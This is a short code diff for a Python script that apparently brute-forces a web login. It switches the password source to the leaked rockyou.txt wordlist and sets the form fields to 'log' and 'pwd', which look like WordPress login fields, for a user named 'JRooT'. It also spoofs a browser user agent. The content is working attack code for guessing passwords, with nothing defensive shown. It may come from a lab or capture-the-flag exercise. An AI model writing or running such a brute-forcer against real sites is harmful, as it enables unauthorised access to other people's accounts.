@@ -3,7 +3,7 @@
 import requests
 import sys
 
-arquivo = open('dicionarioquequiser.txt')
+arquivo = open('rockyou.txt')
 
 url = sys.argv[1]
 
@@ -11,7 +11,7 @@ urls = arquivo.readlines()
 
 for i in urls:
 
-	dados = {'username': 'yagho', 'password': i}
+	dados = {'log': 'JRooT', 'pwd': i}
 
 	cabecalho = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'}
 
